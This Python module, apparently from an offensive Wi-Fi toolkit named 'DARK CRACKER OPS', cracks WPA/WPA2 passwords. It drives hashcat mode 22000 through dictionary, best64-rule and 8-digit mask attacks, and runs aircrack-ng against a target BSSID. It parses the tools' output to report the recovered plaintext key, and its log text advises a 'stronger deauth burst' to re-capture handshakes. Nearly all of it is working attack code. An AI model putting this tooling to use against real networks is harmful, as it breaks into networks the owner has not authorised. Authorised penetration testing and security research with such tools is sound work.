"""
modules/cracker.py — DARK CRACKER OPS Generation 2
Password cracking worker supporting PMKID (hashcat -m 22000) and
WPA handshake (aircrack-ng) capture types with real-time progress reporting.
"""

import os
import re
import subprocess
from typing import Callable, Optional

from core.worker import BaseWorker
from core.config import TOOLS
from core.logger import get_logger

log = get_logger("cracker")


class Cracker(BaseWorker):
    """
    Offline password cracker thread.

    For PMKID captures: uses hashcat -m 22000 (PMKID/MIC unified format)
    For WPA handshake .cap files: uses aircrack-ng -w {wordlist}

    Callbacks:
        on_log(str, str)    — (tag, message) for terminal widget
        on_progress(int)    — 0-100 cracking progress
        on_password(str)    — plaintext password when cracked
        on_finished(bool)   — True if cracked, False if exhausted/stopped
        on_speed(str)       — e.g. "8.2 MH/s | ETA: 00:45:22"
    """

    def __init__(
        self,
        config: dict,
        on_log: Optional[Callable] = None,
        on_progress: Optional[Callable] = None,
        on_password: Optional[Callable] = None,
        on_finished: Optional[Callable] = None,
        on_speed: Optional[Callable] = None,
    ):
        """
        config keys:
            capture_file   str  — path to .hc22000 or .cap file
            capture_type   str  — "pmkid" | "handshake"
            wordlist       str  — path to wordlist file
            bssid          str  — target BSSID (required for aircrack-ng)
            ssid           str  — target SSID (for logging)
        """
        super().__init__()
        self.config      = config
        self.on_log      = on_log
        self.on_progress = on_progress
        self.on_password = on_password
        self.on_finished = on_finished
        self.on_speed    = on_speed
        self._proc       = None

    # ── Thread entry point ────────────────────────────────────────────────────

    def run(self):
        capture_file = self.config.get("capture_file", "")
        capture_type = self.config.get("capture_type", "handshake").lower()
        wordlist     = self.config.get("wordlist", "")
        bssid        = self.config.get("bssid", "")
        ssid         = self.config.get("ssid", "<unknown>")

        # --- Validate inputs ---
        if not capture_file or not os.path.exists(capture_file):
            self._call(self.on_log, "ERROR", f"Capture file not found: {capture_file}")
            self._call(self.on_finished, False)
            return

        if not wordlist or not os.path.exists(wordlist):
            self._call(self.on_log, "ERROR", f"Wordlist not found: {wordlist}")
            self._call(self.on_finished, False)
            return

        wordlist_lines = self._count_lines(wordlist)
        self._call(self.on_log, "CRACK",
            f"Target: {ssid} ({bssid}) | Wordlist: {wordlist_lines:,} entries | "
            f"Mode: {capture_type.upper()}")
        self._call(self.on_progress, 2)

        if capture_type == "pmkid":
            self._crack_hashcat(capture_file, wordlist, wordlist_lines)
        else:
            self._crack_aircrack(capture_file, wordlist, bssid, wordlist_lines)

    # ── hashcat cracker ───────────────────────────────────────────────────────

    def _crack_hashcat(self, hash_file: str, wordlist: str, total_lines: int):
        """
        Crack using hashcat -m 22000 (WPA-PMKID/MIC unified).
        Parses STATUS output for speed, progress, and recovered passwords.
        """
        hashcat = TOOLS.get("hashcat", "hashcat")

        pot_file = hash_file.replace(".hc22000", ".pot")
        cmd = [
            hashcat,
            "-m", "22000",
            hash_file,
            wordlist,
            "--force",
            "--status",
            "--status-timer=3",
            "--potfile-path", pot_file,
            "--outfile-format=2",     # hash:plain
            "-O",                     # optimised kernels
        ]

        self._call(self.on_log, "CRACK", "hashcat -m 22000 starting…")
        self._call(self.on_log, "CRACK", f"Hash: {hash_file}")
        self._call(self.on_log, "CRACK", f"Wordlist: {wordlist}")

        try:
            self._proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
            )
        except FileNotFoundError:
            self._call(self.on_log, "ERROR", "hashcat not found — install hashcat")
            self._call(self.on_finished, False)
            return
        except Exception as exc:
            self._call(self.on_log, "ERROR", f"hashcat launch failed: {exc}")
            self._call(self.on_finished, False)
            return

        cracked_password = None
        status_buffer    = []
        in_status_block  = False

        for line in self._iter_lines(self._proc):
            if self.is_stopped():
                break

            stripped = line.strip()
            if not stripped:
                if in_status_block:
                    # Process buffered status block
                    block_text = "\n".join(status_buffer)
                    speed, eta, pct = self._parse_hashcat_status(block_text, total_lines)
                    if speed:
                        self._call(self.on_speed, speed)
                        self._call(self.on_log, "CRACK", f"Speed: {speed}")
                    if pct > 0:
                        self._call(self.on_progress, pct)
                    status_buffer = []
                    in_status_block = False
                continue

            # Detect start of STATUS block
            if stripped.startswith("Session..........:") or \
               stripped.startswith("Status...........:"):
                in_status_block = True

            if in_status_block:
                status_buffer.append(stripped)

            # Detect successful crack
            # hashcat prints: "hash:plaintext" on status or in outfile
            if re.search(r"\$802\.1x\$.*:(\S+)$", stripped) or \
               "Recovered.........: 1/" in stripped:
                # Try to get password from pot file
                cracked_password = self._read_pot_file(pot_file)
                if cracked_password:
                    self._call(self.on_log, "CRACK", f"PASSWORD FOUND: {cracked_password}")
                    self._call(self.on_password, cracked_password)
                    break

            # Inline password output (--outfile-format=2 prints to stdout too).
            # Require >= 30 hex/star chars before the colon so we don't
            # accidentally match hashcat device-info lines like "#1: cpu-haswell-…"
            # which also contain a colon (the real WPA*02* hash is hundreds of chars).
            pot_m = re.match(r"[a-f0-9*]{30,}:(.+)$", stripped)
            if pot_m:
                candidate = pot_m.group(1).strip()
                if candidate and len(candidate) >= 8:
                    cracked_password = candidate
                    self._call(self.on_log, "CRACK", f"PASSWORD FOUND: {candidate}")
                    self._call(self.on_password, candidate)
                    break

        # Drain process
        try:
            self._proc.wait(timeout=10)
        except subprocess.TimeoutExpired:
            self._proc.kill()

        # Final check: read pot file even if loop ended normally
        if not cracked_password and os.path.exists(pot_file):
            cracked_password = self._read_pot_file(pot_file)
            if cracked_password:
                self._call(self.on_log, "CRACK", f"PASSWORD FOUND (potfile): {cracked_password}")
                self._call(self.on_password, cracked_password)

        if cracked_password:
            self._call(self.on_progress, 100)
            self._call(self.on_finished, True)
            return
        elif self.is_stopped():
            return

        self._call(self.on_log, "CRACK", "hashcat: exhausted wordlist — trying rule-based attack…")

        # ── Rule-based attack (best64.rule) ────────────────────────────────────
        rule_file = "/usr/share/hashcat/rules/best64.rule"
        if os.path.exists(rule_file):
            self._call(self.on_log, "CRACK", "Running rule-based attack (best64.rule)…")
            rule_cmd = [
                hashcat,
                "-m", "22000",
                hash_file,
                wordlist,
                "--force",
                "--status",
                "--status-timer=3",
                "--potfile-path", pot_file,
                "--outfile-format=2",
                "-O",
                "-r", rule_file,
            ]
            try:
                self._proc = subprocess.Popen(
                    rule_cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    bufsize=1,
                )
                for line in self._iter_lines(self._proc):
                    if self.is_stopped():
                        break
                    stripped = line.strip()
                    if re.search(r"Recovered.........: 1/", stripped):
                        cracked_password = self._read_pot_file(pot_file)
                        if cracked_password:
                            break
                    pot_m = re.match(r"[a-f0-9*]{30,}:(.+)$", stripped)
                    if pot_m:
                        candidate = pot_m.group(1).strip()
                        if candidate and len(candidate) >= 8:
                            cracked_password = candidate
                            break
                try:
                    self._proc.wait(timeout=10)
                except subprocess.TimeoutExpired:
                    self._proc.kill()
            except Exception as exc:
                self._call(self.on_log, "CRACK", f"Rule attack error: {exc}")

            if not cracked_password and os.path.exists(pot_file):
                cracked_password = self._read_pot_file(pot_file)

            if cracked_password:
                self._call(self.on_log, "CRACK", f"PASSWORD FOUND (rule attack): {cracked_password}")
                self._call(self.on_password, cracked_password)
                self._call(self.on_progress, 100)
                self._call(self.on_finished, True)
                return
        else:
            self._call(self.on_log, "CRACK", "best64.rule not found — skipping rule-based attack")

        if self.is_stopped():
            return

        # ── Mask attack (?d×8) ─────────────────────────────────────────────────
        self._call(self.on_log, "CRACK", "Running mask attack (?d×8)…")
        mask_cmd = [
            hashcat,
            "-m", "22000",
            hash_file,
            "-a", "3",
            "?d?d?d?d?d?d?d?d",
            "--force",
            "--status",
            "--status-timer=3",
            "--potfile-path", pot_file,
            "--outfile-format=2",
            "-O",
        ]
        try:
            self._proc = subprocess.Popen(
                mask_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
            )
            for line in self._iter_lines(self._proc):
                if self.is_stopped():
                    break
                stripped = line.strip()
                if re.search(r"Recovered.........: 1/", stripped):
                    cracked_password = self._read_pot_file(pot_file)
                    if cracked_password:
                        break
                pot_m = re.search(r"[a-f0-9*]+:(.+)$", stripped)
                if pot_m and "Status" not in stripped and "Session" not in stripped:
                    candidate = pot_m.group(1).strip()
                    if candidate and len(candidate) >= 8:
                        cracked_password = candidate
                        break
            try:
                self._proc.wait(timeout=10)
            except subprocess.TimeoutExpired:
                self._proc.kill()
        except Exception as exc:
            self._call(self.on_log, "CRACK", f"Mask attack error: {exc}")

        if not cracked_password and os.path.exists(pot_file):
            cracked_password = self._read_pot_file(pot_file)

        if cracked_password:
            self._call(self.on_log, "CRACK", f"PASSWORD FOUND (mask attack): {cracked_password}")
            self._call(self.on_password, cracked_password)
            self._call(self.on_progress, 100)
            self._call(self.on_finished, True)
        elif not self.is_stopped():
            self._call(self.on_log, "CRACK",
                "hashcat: all attack modes exhausted — password not found")
            self._call(self.on_progress, 100)
            self._call(self.on_finished, False)

    def _parse_hashcat_status(self, block: str, total_lines: int) -> tuple[str, str, int]:
        """
        Parse a hashcat STATUS block and return (speed_str, eta_str, pct_int).
        Returns ("", "", 0) if parsing fails.
        """
        speed_str = ""
        eta_str   = ""
        pct       = 0

        # Speed line: "Speed.#1.........:   123.4 MH/s (12.34ms) @ Accel:..."
        speed_m = re.search(r"Speed\.#\d+\.+:\s+([\d.]+\s+\w+/s)", block)
        if speed_m:
            speed_str = speed_m.group(1).strip()

        # ETA line: "Time.Estimated...: Thu Mar 11 14:22:33 2026 (1 hour, 22 mins)"
        eta_m = re.search(r"Time\.Estimated\.\.\.:.*?\(([^)]+)\)", block)
        if eta_m:
            eta_str = eta_m.group(1).strip()

        # Progress: "Progress.........: 12345/1000000 (1.23%)"
        prog_m = re.search(r"Progress\.+:\s*(\d+)/(\d+)\s*\(([0-9.]+)%\)", block)
        if prog_m:
            try:
                pct = min(99, int(float(prog_m.group(3))))
            except ValueError:
                pass

        # Recovered: "Recovered.........: 1/1 (100.00%)"
        recovered_str = ""
        rec_m = re.search(r"Recovered\.+:\s*(\d+/\d+)", block)
        if rec_m:
            recovered_str = f" | Recovered: {rec_m.group(1)}"

        # Rejected: "Rejected.........: 0/12345678 (0.00%)"
        rejected_str = ""
        rej_m = re.search(r"Rejected\.+:\s*(\d+/\d+)", block)
        if rej_m:
            rejected_str = f" | Rejected: {rej_m.group(1)}"

        # Guess.Base: "Guess.Base.......: File (rockyou.txt)"
        guess_str = ""
        guess_m = re.search(r"Guess\.Base\.+:\s*(.+)$", block, re.MULTILINE)
        if guess_m:
            guess_str = f" | Base: {guess_m.group(1).strip()[:30]}"

        speed_display = speed_str
        if eta_str:
            speed_display += f" | ETA: {eta_str}"
        speed_display += recovered_str + rejected_str + guess_str

        return speed_display, eta_str, pct

    def _read_pot_file(self, pot_file: str) -> str | None:
        """
        Read last entry from hashcat pot file.
        Format: hash:plaintext_password
        """
        if not os.path.exists(pot_file):
            return None
        try:
            with open(pot_file, "r", errors="replace") as fh:
                lines = [l.strip() for l in fh if l.strip()]
            if not lines:
                return None
            last = lines[-1]
            # Find last colon separator
            idx = last.rfind(":")
            if idx > 0:
                return last[idx + 1:].strip()
        except Exception as exc:
            log.debug("pot file read error: %s", exc)
        return None

    # ── aircrack-ng cracker ───────────────────────────────────────────────────

    def _crack_aircrack(self, cap_file: str, wordlist: str,
                        bssid: str, total_lines: int):
        """
        Crack WPA handshake .cap file using aircrack-ng.
        Parses real-time output for speed, key index, and KEY FOUND message.
        """
        aircrack = TOOLS.get("aircrack", "aircrack-ng")
        cmd = [aircrack, "-w", wordlist, "-b", bssid, cap_file]

        self._call(self.on_log, "CRACK", "aircrack-ng starting…")
        self._call(self.on_log, "CRACK", f"Cap: {cap_file} | Wordlist: {wordlist}")

        try:
            self._proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
            )
        except FileNotFoundError:
            self._call(self.on_log, "ERROR", "aircrack-ng not found")
            self._call(self.on_finished, False)
            return
        except Exception as exc:
            self._call(self.on_log, "ERROR", f"aircrack-ng launch failed: {exc}")
            self._call(self.on_finished, False)
            return

        cracked_password = None
        last_key_index   = 0

        for line in self._iter_lines(self._proc):
            if self.is_stopped():
                break

            stripped = line.strip()
            if not stripped:
                continue

            # KEY FOUND detection:
            # "KEY FOUND! [ password123 ]"
            found_m = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", stripped, re.IGNORECASE)
            if found_m:
                cracked_password = found_m.group(1).strip()
                self._call(self.on_log, "CRACK", f"PASSWORD FOUND: {cracked_password}")
                self._call(self.on_password, cracked_password)
                break

            # Incomplete / invalid handshake — aircrack-ng exits immediately
            # with these messages when the .cap has no crackable EAPOL exchange.
            # This is a capture problem, NOT a wordlist miss — report it clearly.
            if re.search(
                r"no valid wpa handshake|"
                r"no networks found|"
                r"got \d+ eapol frames? \(got \d+",
                stripped, re.IGNORECASE
            ):
                self._call(self.on_log, "CRACK",
                    f"aircrack-ng: incomplete/invalid handshake — {stripped}. "
                    "Re-capture with a stronger deauth burst or wait for a client to re-associate.")
                self._call(self.on_progress, 100)
                self._call(self.on_finished, False)
                return

            # Failed line: "Passphrase not in dictionary"
            if re.search(r"passphrase not in dictionary", stripped, re.IGNORECASE):
                self._call(self.on_log, "CRACK", "aircrack-ng: passphrase not found in wordlist")
                break

            # Speed / progress line:
            # "[00:00:10] 123456 keys tested (12345.67 k/s)"
            speed_m = re.search(
                r"\[[\d:]+\]\s+([\d,]+)\s+keys tested\s+\(([\d.]+\s*\w+/s)\)",
                stripped, re.IGNORECASE
            )
            if speed_m:
                keys_tested = int(speed_m.group(1).replace(",", ""))
                speed_raw   = speed_m.group(2).strip()

                # Normalise speed string to MH/s for consistency
                speed_display = self._normalise_speed(speed_raw)

                # Estimate ETA
                eta_str = self._estimate_eta(keys_tested, total_lines, speed_raw)
                full_speed = f"{speed_display}"
                if eta_str:
                    full_speed += f" | ETA: {eta_str}"

                self._call(self.on_speed, full_speed)

                # Calculate progress percentage
                if total_lines > 0 and keys_tested != last_key_index:
                    pct = min(99, int((keys_tested / total_lines) * 100))
                    self._call(self.on_progress, pct)
                    last_key_index = keys_tested

            else:
                # Log other significant lines (not screen-refresh junk)
                if len(stripped) > 5 and not stripped.startswith("\x1b"):
                    log.debug("aircrack-ng: %s", stripped)

        try:
            self._proc.wait(timeout=10)
        except subprocess.TimeoutExpired:
            self._proc.kill()

        if cracked_password:
            self._call(self.on_progress, 100)
            self._call(self.on_finished, True)
        elif not self.is_stopped():
            self._call(self.on_progress, 100)
            self._call(self.on_finished, False)

    # ── Utility helpers ───────────────────────────────────────────────────────

    def _iter_lines(self, proc: subprocess.Popen):
        """Generator that yields stdout lines from a Popen process."""
        try:
            for line in proc.stdout:
                if self.is_stopped():
                    break
                yield line
        except Exception as exc:
            log.debug("_iter_lines exception: %s", exc)

    @staticmethod
    def _count_lines(path: str) -> int:
        """Count lines in a file efficiently."""
        count = 0
        try:
            with open(path, "rb") as fh:
                buf = bytearray(65536)
                while True:
                    n = fh.readinto(buf)
                    if not n:
                        break
                    count += buf[:n].count(b"\n")
        except Exception:
            pass
        return count

    @staticmethod
    def _normalise_speed(speed_raw: str) -> str:
        """Convert aircrack-ng speed string to consistent MH/s format."""
        m = re.match(r"([\d.]+)\s*(\w+)/s", speed_raw.strip())
        if not m:
            return speed_raw
        val  = float(m.group(1))
        unit = m.group(2).upper()
        if unit == "K":
            return f"{val / 1_000:.2f} MH/s"
        elif unit in ("M", "MH"):
            return f"{val:.2f} MH/s"
        elif unit in ("G", "GH"):
            return f"{val * 1000:.1f} MH/s"
        return speed_raw

    @staticmethod
    def _estimate_eta(tested: int, total: int, speed_raw: str) -> str:
        """Return formatted ETA string given tested count, total, and speed."""
        if total <= 0 or tested >= total:
            return ""
        remaining = total - tested
        # Parse speed in keys/s
        m = re.match(r"([\d.]+)\s*(\w+)/s", speed_raw.strip())
        if not m:
            return ""
        val  = float(m.group(1))
        unit = m.group(2).upper()
        if unit == "K":
            kps = val * 1_000
        elif unit == "M":
            kps = val * 1_000_000
        elif unit == "G":
            kps = val * 1_000_000_000
        else:
            kps = val
        if kps <= 0:
            return ""
        eta_s = int(remaining / kps)
        h, rem = divmod(eta_s, 3600)
        m2, s  = divmod(rem, 60)
        return f"{h:02d}:{m2:02d}:{s:02d}"

    # ── Public control API ────────────────────────────────────────────────────

    def stop(self) -> None:
        """Stop cracking and terminate subprocess."""
        super().stop()
        if self._proc:
            try:
                self._proc.terminate()
                self._proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._proc.kill()
            except Exception:
                pass
